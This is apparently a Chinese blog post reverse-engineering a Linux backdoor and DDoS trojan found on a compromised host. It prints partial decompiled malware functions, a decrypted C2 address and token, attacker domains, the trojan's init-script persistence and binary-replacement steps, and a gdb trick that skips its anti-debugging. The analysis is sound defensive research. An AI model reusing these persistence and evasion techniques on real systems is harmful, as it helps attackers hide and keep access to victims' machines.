<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/Hwp6axEuvei97jU.png" alt="image-20211226175327581"></p>
<p>.ssh下的authoritized keys被攻击者访问或修改过</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/5vx7y6gKJrbD43q.png" alt="image-20220106154530439"></p>
<h2 id="分析DbSecuritySpt"><a href="#分析DbSecuritySpt" class="headerlink" title="分析DbSecuritySpt"></a>分析DbSecuritySpt</h2><p>发现木马的位置是在./etc/init.d/DbSecuritySpt，./etc/init.d/DbSecuritySpt是一个文本文件，文本里的861fa10b52文件已经有读写执行权限了</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/ZhEv4LtTd1XUsSw.png" alt="image-20211226175550589"></p>
<p>放沙箱分析发现是一个后门程序，属于远控木马</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/aN23C8GOwtD5rsA.png" alt="image-20211226165517183"></p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/5iBwsCZ4YmNqDM2.png" alt="image-20211226165758787"></p>
<p>继续分析selinux开机启动程序，发现也是一个后门程序</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/1YZvHyuSinCXaAp.png" alt="image-20211226170013614"></p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/zYw2yGmJENI9x5j.png" alt="image-20211226170335758"></p>
<p>查看是否加壳，并没有</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/c9EgXJiyn6bGK83.png" alt="image-20211226181158609"></p>
<p>直接放ida分析，字符串里面可以看到一些IP信息，加载内核命令，恶意攻击函数名，充满了恶意</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/ZNtp9TCxErgd7sY.png" alt="image-20211226181004757"></p>
<p>随后还有331个ip在木马程序里，猜测是331个肉鸡</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/W4TviQxPhDj1oEs.png" alt="image-20211226181427614"></p>
<p>分析main函数，程序逻辑很简单，CSysTool::CheckGatesType(v11);决定g_iGatesType类型，木马做什么，四个功能，分别是检查更新、MainBeikong，MainBackdoor（后门），MainSystool，MainMonitor</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  CFileOp *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">  CSysTool::CheckGatesType(v11);</span><br><span class="line">  CSysTool::Ikdfu94();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)CSysTool::IsUpdateTemporary(v12) )</span><br><span class="line">  &#123;</span><br><span class="line">    CSysTool::DoUpdate((CSysTool *)argc, (<span class="keyword">int</span>)argv);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( g_iGatesType == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    MainBeikong();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( g_iGatesType &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( g_iGatesType == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      MainBackdoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( g_iGatesType == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      MainSystool(argc, (<span class="keyword">char</span> **)argv);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !g_iGatesType )</span><br><span class="line">  &#123;</span><br><span class="line">    MainMonitor();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)v13);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)v14);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在四个分支执行之前，有一个Ikdfu94函数需要注意的，里面有一串很长的字符串</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/RIsFWpr4GmtY6NV.png" alt="image-20211226202528577"></p>
<p>目前这段字符串是加密的，解密算法好像很复杂，还没研究明白</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">88FD2FE8EF8D51263B037677FD30F25CBFEB57F759F711FB41956288A85E9655F54FCCD1ABAAE55CF8BFB033B8F30342EC9930E4DA755715E37BFDF38ACFCC52569DA683A2B3B87A5C571840486689B97D8E7660C3F644B1F7F00778DBDEDE4CFD0CBBB222FC42C8F8ECE125D09D98EC50E5CF8093CF81D9E4F67FBA1E6A90O963846C17933E3C078E1EC409C799C84741C04892CC25E69FED40664BC85B955BEE188A63C9A3909D187ADE7DB69A66F83878E56E2FDD7CD5866DC4AC41EFC7EE9785806DAC64C1953F6A22F99317337B9F0DF3E26C365A8075076FA258CE2F0D6AC63BD6783E2A27CEB2A2410BC80232BABE5FB2C015263E64E1BAE2369822F</span><br></pre></td></tr></table></figure>

<p>再来到MainBeikong，函数先会调用daemon创建一个后台进程。在daemon里，父进程会直接exit(0)退出，子进程会调用setsid()，setsid()调用成功后，返回新的会话的ID，调用setsid函数的进程成为新的会话的领头进程，并与其父进程的会话组和进程组脱离。此时子进程的父进程会变成1号进程。然后改变当前目录为“/“</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MainBeikong</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  CSysTool *v1; <span class="comment">// eax</span></span><br><span class="line">  CUtility *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  CSysTool *v4; <span class="comment">// eax</span></span><br><span class="line">  CSysTool *v5; <span class="comment">// eax</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">  result = daemon(<span class="number">1</span>, <span class="number">0</span>) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">  &#123;</span><br><span class="line">    CSysTool::KillChaos(v19);</span><br><span class="line">    v1 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strML);</span><br><span class="line">    CSysTool::KillPid(v1, v10);</span><br><span class="line">    CSysTool::KillPid((CSysTool *)<span class="string">&quot;/tmp/bill.lock&quot;</span>, v11);</span><br><span class="line">    CFileOp::RemoveFile((CFileOp *)<span class="string">&quot;/tmp/bill.lock&quot;</span>, v12);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)CSysTool::KillGatesIfExist(v20) != <span class="number">1</span> )</span><br><span class="line">      MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( g_iIsService == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (CUtility *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strSN);</span><br><span class="line">      CUtility::SetAutoStart(v2, (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">0x61</span>, v18);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_iDoBackdoor == <span class="number">1</span> &amp;&amp; (<span class="keyword">unsigned</span> __int8)CUtility::IsRoot(v21) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strBDG);</span><br><span class="line">      CSysTool::GetBackDoorLockFile((CSysTool *)v25, v3);</span><br><span class="line">      v4 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)v25);</span><br><span class="line">      CSysTool::KillPid(v4, v14);</span><br><span class="line">      CSysTool::GetBackDoorLockFile((CSysTool *)v26, <span class="string">&quot;udevd&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(v25, v26);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)v26);</span><br><span class="line">      v5 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)v25);</span><br><span class="line">      CSysTool::KillPid(v5, v15);</span><br><span class="line">      v6 = (CFileOp *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)v25);</span><br><span class="line">      CFileOp::RemoveFile(v6, v16);</span><br><span class="line">      v7 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strBDG);</span><br><span class="line">      CSysTool::GetBackDoorFile((CSysTool *)v24, v7);</span><br><span class="line">      v8 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)v24);</span><br><span class="line">      CSysTool::ReleaseAndStartGates(v8, v17);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)v24);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)v25);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)CUtility::IsRoot(v21) )</span><br><span class="line">    &#123;</span><br><span class="line">      CSysTool::SetBeikongPathfile(v22);</span><br><span class="line">      v9 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strMonitorFile);</span><br><span class="line">      CSysTool::ReleaseAndStartGates(v9, v13);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CFileOp::RemoveFile((CFileOp *)<span class="string">&quot;/tmp/notify.file&quot;</span>, v13);</span><br><span class="line">    &#125;</span><br><span class="line">    MainProcess();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">daemon</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">....</span><br><span class="line">  v2 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( setsid() == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = _open_nocancel(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">-1</span> || _fxstat64(<span class="number">3</span>, v4, &amp;v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = sys_close(v4);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (v7.st_mode &amp; <span class="number">0xF000</span>) == <span class="number">0x2000</span> &amp;&amp; v7.st_rdev == <span class="number">259</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dup2(v4, <span class="number">0</span>);</span><br><span class="line">    dup2(v4, <span class="number">1</span>);</span><br><span class="line">    dup2(v4, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    close(v4);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = sys_close(v4);</span><br><span class="line">    __writegsdword(<span class="number">0xFFFFFFE8</span>, <span class="number">0x13</span>u);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MainBeikong还会通过KillChaos来判断pid文件中的pid是否和当前运行的pid一致，如果不一致就杀掉当前进程，接着会调用RemoveFIle将文件/tmp/bill.lock移除，随后的KillGatesIfExist检测pid，SetAutoStart自启</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/eFQ5Sg6h1xrscOZ.png" alt="image-20211226203145883"></p>
<p>KillGatesIfExist也是进程检测，不同于之前的是这次会把pid写进去</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/URtnKcGJCmXbEWY.png" alt="image-20211226203445072"></p>
<p>SetAutoStart将木马加入了自启</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/8tbhmTH2Bx4AEcV.png" alt="image-20211226203642794"></p>
<p>分析MainBackdoor，先会去锁定后门木马程序，然后SetAutoStart函数将之加入开机启动</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MainBackdoor</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  CSysTool *v1; <span class="comment">// eax</span></span><br><span class="line">  CSysTool *v2; <span class="comment">// eax</span></span><br><span class="line">  CUtility *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( daemon(<span class="number">1</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strBDG);</span><br><span class="line">    CSysTool::GetBackDoorLockFile((CSysTool *)v7, v0);</span><br><span class="line">    v1 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)v7);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)CSysTool::IsPidExist(v1, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (CSysTool *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)v7);</span><br><span class="line">      CSysTool::MarkPid(v2, g_iBackdoorLock, v6);</span><br><span class="line">      v3 = (CUtility *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;g_strBDSN);</span><br><span class="line">      CUtility::SetAutoStart(v3, (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">0x63</span>);</span><br><span class="line">      CSysTool::HandleSystools((CSysTool *)&amp;unk_8100D38, v5);</span><br><span class="line">      MainProcess();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)v7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再MainProcess里，有一个DNSCache的，此函数是用来更新DNS</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/4UeMPaCADRl8YgV.png" alt="image-20211226204046300"></p>
<p>更新函数CSysTool::DoUpdate中有一个”google”字符串的</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/X8N9DcGY1vK2g73.png" alt="image-20211226204248852"></p>
<p>再一个CStatBase::Initialize用来获取系统信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">CStatBase::Initialize</span><span class="params">(CStatBase *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CStatBase::GetOs(<span class="keyword">this</span>);</span><br><span class="line">  CStatBase::GetCpuSpd(<span class="keyword">this</span>);</span><br><span class="line">  CStatBase::InitCpuUse(<span class="keyword">this</span>);</span><br><span class="line">  CStatBase::InitNetUse(<span class="keyword">this</span>);</span><br><span class="line">  CStatBase::GetMemSize(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> CStatBase::GetLocalDevicesInfo(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析完这些还是没能找到攻击者的一些信息，推测就是前面那一串字符串加密了，攻击者的信息应该存放在那段很长的字符串中，现在试试网络抓包的方式看看能不能找到攻击者的信息，现在自己的虚拟机上运行木马程序，果不其然中招了</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/W2TeE7HgFM3YNmC.png" alt="image-20211226191350027"></p>
<p>用wireshark抓包，出现了可疑的陌生域名gaopei.dnsm.xyz和601.dnsm.xyz，</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/sEQ8Vuzw173MO9T.png" alt="image-20211226191252186"></p>
<p>在main函数的开头，Ower6msf内是第一组解密数据的函数</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/ygUVxd8FbHoesnJ.png" alt="image-20220103142824187"></p>
<p>通过gdb可以直接调出来加密字符串解密后的内容</p>
<p>先对0x8077CF0（Ower6msf函数的地址）进行断点</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/breoYO9aWCQyS2n.png" alt="image-20220103143055378"></p>
<p>紧接着把加密字符串传入了寄存器</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/QjYB4afk1EPin5F.png" alt="image-20220103143203323"></p>
<p>接下来逐步对解密的地方逐一断点就行，字符串解密出来是”/usr/bin/.sshd:30000:1223123:772124:773152:4f58574098255d”</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/QvBILJmgiojAw1r.png" alt="image-20220103144223118"></p>
<p>上面解密出来的字符串会依次赋值给g_strMonitorFile、g_uHiddenPt、g_iFIleSize、g_iHardStart、g_iSoftStart、g_strDoFun对应值如下</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/DYsWNp65SQXgyUr.png" alt="image-20220103144136001"></p>
<p>接下来继续往下，发现有反gdb调试的</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/h8936lKfv14yjtB.png" alt="image-20220103144500856"></p>
<p>虽然反gdb调试，但就是个笑话，我们直接控制EIP跳过反调试函数就行了（都没必要patch）</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/se73qikh8VtRXlK.png" alt="image-20220103144834119"></p>
<p>先断点到0x8062716，然后set $eip=0x8062723，直接绕过反调试了</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/Q5YuAFcLDB9j7ZS.png" alt="image-20220103145001073"></p>
<p>接下来进入第二次解密函数Ikdfu94，解密出来的信息“115.231.218.64:8226:1:1:ssh4ckss:1”</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/zE5DnTJU3hckVyi.png" alt="image-20220103145810396"></p>
<p>域名也解密出来了</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/amJzCEVBNe53RwZ.png" alt="image-20220103150830270"></p>
<p>断点到0x80625b2处后发现木马逃跑了<img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/NDZg9YQLtnIXKPV.png" alt="image-20220103152908875"></p>
<p>在ida中分析逃跑的地址，发现刚开始运行的进程会在RunLinuxShell中创建一个子进程，然后子进程完成cp file /usr/bin/bsd-port/getty命令</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/qXY3KAFNraVnHdT.png" alt="image-20220103212217538"></p>
<p>总结：</p>
<p>Gatestype == 0时，执行MainMonitor，创建子进程并向<code>/tmp/moni.lod</code>文件写入进程号，读取并删除<code>/tmp/notify.file</code>文件，线程循环挂起一分钟。</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/qQPWlbsR3a2L8k9.png" alt="image-20220106140542757"></p>
<p>Gatestype == 1时，执行MainBeikong，</p>
<p>结束并删除<code>/tmp/moni.lod</code>进程。创建自启动项<code>/etc/init.d/DbSecuritySpt</code>，并写入<code>#!/bin/bash\n(filepath)\n</code>filepath为当前程序路径。创建自启动项<code>/etc/rc(1-5).d/S97DbSecuritySpt</code>，执行<code>ln -s /etc/init.d/DbSecuritySpt (filepath)</code>创建软链接。</p>
<p>判断当前<code>g_iDoBackdoor</code>的值以及当前进程是否为root用户创建，如果都为true，则结束<code>/usr/bin/bsd-port/getty.lock</code>进程和<code>/usr/bin/bsd-port/udevd.lock</code>进程，并删除第二个文件。并且命令执行拷贝进程文件于<code>/usr/bin/bsd-port/getty</code>。</p>
<p>如果是root执行的程序，则命令执行拷贝进程文件在<code>/usr/bin/.sshd</code>。</p>
<p>如果不是root执行的，则删除<code>/tmp/notify.file</code>。</p>
<p>最终执行<code>MainProcess</code>函数，删除进程路径下的update_temporary。在<code>/etc/resolv.conf</code>下添加DNS（8.8.8.8和8.8.4.4）。初始化conf.n和cmd.n文件，初始化计算机基本信息（cpu、os、net、内存和磁盘信息）。初始化330个DNS地址。读取/usr/lib/libamplify.so文件配置amp资源数据。</p>
<p>后面就是服务端根据受害者计算机返回的信息，初始化数据执行对应的DDOS攻击：</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/uUyHf9S8c54hwCz.png" alt="image-20220103221915025"></p>
<p>GatesType == 2时</p>
<p>判断是否存在<code>/usr/bin/bsd-port/getty.lock</code>后门文件，存在则写入进程号并创建<code>etc/init.d/selinux</code>和<code>/etc/rc(1-5).d/S99selinux</code>启动项文件，之后和上面创建启动项相同，不过项目换了一个，就不多说了。然后判断如果存在<code>Systools</code>中的文件，则复制到<code>/usr/bin/dpkgd/md</code>文件下生成netstat，lsof等文件，并设置0755权限，最后又执行了同上面一样的<code>MainProcess</code>函数。</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/Y6SL5k2wrDh4Kad.png" alt="image-20220103222025649"></p>
<p>GatesType == 3时</p>
<p>执行<code>MainSystool</code>函数。此函数主要调用上面所说的复制过去的netstat、lsof、ps等程序，而后过滤掉进程目录，服务端输出。</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/vNBpu8A53sxItXJ.png" alt="image-20220106140704691"></p>
